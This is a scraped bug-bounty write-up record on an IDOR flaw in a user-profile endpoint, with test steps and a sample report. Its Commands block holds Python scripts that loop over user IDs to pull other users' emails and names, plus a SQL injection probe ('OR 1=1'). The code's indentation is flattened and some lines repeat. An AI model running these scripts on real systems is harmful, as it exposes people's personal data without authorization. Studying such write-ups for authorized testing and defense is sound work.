---
id: d2fb3833888f
title: "Writing Custom Exploits: From Vulnerability Discovery to Working PoC"
source_url: https://medium.com/@atnoforcybersecurity/writing-custom-exploits-from-vulnerability-discovery-to-working-poc-f1e760231990
author: "ATNO For Cybersecurity | Hacking"
publication_date: 2026-08-02
category: idor
category_label: "IDOR"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "cybersecurity"
  - "bug-bounty"
  - "custom-exploit"
  - "exploit"
  - "ethical-hacking"
tools:
  - "Burp Suite"
  - "Metasploit"
  - "Wireshark"
  - "curl"
quick_test: "Test if changing the ID parameter in the user profile endpoint allows access to other users' data."
---

## Use case

The vulnerability exists in the user profile endpoint where an authenticated user can access another user's profile data by manipulating the ID parameter. This is critical as it allows unauthorized access to sensitive user information.

## Steps to test

1. Log in as any user.
2. Navigate to /api/user/profile?id=YOUR_USER_ID.
3. Change the id parameter to any other integer.
4. Observe that you receive another user's profile data.

## Commands

```text
GET /api/user/profile?id=1042
import requests
session_cookie = 'your_session_cookie_here'
headers = {'Cookie': f'session={session_cookie}'}
for user_id in range(1000, 1100):
response = requests.get(f'https://target.com/api/user/profile?id={user_id}', headers=headers)
import requests
url = "<https://target.com/search>"
payload = "' OR '1'='1"
response = requests.get(url, params={"q": payload})
print(response.status_code)
print(response.text[:500])
import requests
session_cookie = "your_session_cookie_here"
headers = {"Cookie": f"session={session_cookie}"}
for user_id in range(1000, 1100):
response = requests.get(
f"<https://target.com/api/user/profile?id={user_id}>",
headers=headers
)
if response.status_code == 200:
data = response.json()
print(f"ID {user_id}: {data.get('email')} - {data.get('name')}")
VULNERABILITY: IDOR in user profile endpoint
SEVERITY: High
AFFECTED ENDPOINT: GET /api/user/profile?id=
STEPS TO REPRODUCE:
1. Log in as any user
2. Navigate to /api/user/profile?id=YOUR_USER_ID
3. Change the id parameter to any other integer
4. Observe that you receive another user's profile data
EXPECTED: 403 Forbidden or only your own data
ACTUAL: Full profile data of the target user
IMPACT: Any authenticated user can access the personal
data of every other user in the system.
PROOF OF CONCEPT: [attached script output]
```

## Source

- Author: ATNO For Cybersecurity | Hacking
- Writeup: https://medium.com/@atnoforcybersecurity/writing-custom-exploits-from-vulnerability-discovery-to-working-poc-f1e760231990

_For authorized testing only. Credit the original author._
